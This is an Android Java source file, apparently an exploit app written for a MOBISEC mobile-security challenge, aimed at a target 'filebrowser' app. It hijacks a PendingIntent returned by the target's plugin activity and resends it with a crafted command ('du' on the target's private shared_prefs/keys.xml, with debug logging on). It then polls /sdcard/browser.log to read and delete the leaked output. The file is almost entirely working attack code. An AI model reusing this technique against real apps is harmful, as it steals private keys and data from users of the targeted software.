package com.mobisec.filebrowser_attack;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private final static String TAG = "MOBISEC";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE")
                != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission("android.permission.READ_EXTERNAL_STORAGE")
                        != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{"android.permission.READ_EXTERNAL_STORAGE",
                            "android.permission.WRITE_EXTERNAL_STORAGE"},
                    1);
            return;
        }
        if (ContextCompat.checkSelfPermission(this,"com.mobisec.filebrowser.permission.PLUGIN") == PackageManager.PERMISSION_DENIED) {
            Log.d(TAG,"requestPermissions");
            ActivityCompat.requestPermissions( this, new String[] {
                            "com.mobisec.filebrowser.permission.PLUGIN"  },
                    1);
        }
        Intent i = new Intent();
        i.setComponent(new ComponentName("com.mobisec.filebrowser","com.mobisec.filebrowser.PluginActivity"));
        i.setAction("com.mobisec.browser.action.START_PLUGIN");
        startActivityForResult(i,0);
    }


    private void __filebrowserlod_process(Context context){
        // Check is file exist
        String ret = "";
        File f = new File("/sdcard/browser.log");
        if(f.exists()){
            File sdcard = Environment.getExternalStorageDirectory();
            File file = new File(sdcard,"browser.log");
            StringBuilder text = new StringBuilder();

            try {
                BufferedReader br = new BufferedReader(new FileReader(file));
                String line;

                while ((line = br.readLine()) != null) {
                    text.append(line);
                    text.append('\n');
                }
                br.close();
            }
            catch (Exception e) {
                //You'll need to add proper error handling here
            }
            Log.d(TAG,"log:" + text.toString());
            if (file.delete()) {
                Log.d(TAG,"file Deleted :" + file.getPath());
            } else {
                Log.d(TAG,"file not Deleted :" + file.getPath());
            }
        } else {

        }

    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data)
    {
        super.onActivityResult(requestCode, resultCode, data);
        Log.d(TAG,"onActivityResult");
        PendingIntent pi = (PendingIntent)data.getExtras().get("pi");

        Intent i = new Intent();
        i.putExtra("oper","du");
        i.putExtra("arg","/data/data/com.mobisec.filebrowser/shared_prefs/keys.xml ");
        i.putExtra("debug",true);
        try {
            pi.send(this,0,i);
        } catch (Exception e){
        }

        new Timer().scheduleAtFixedRate(new TimerTask() {
            public void run() {
//                MainActivity.checkForUpdates(MainActivity.this);
                __filebrowserlod_process(MainActivity.this);
            }
        }, 500, 1000);

    }

    private class HandlerCode extends Handler {
        @Override
        public void handleMessage(Message inputMessage) {

        }
    }
}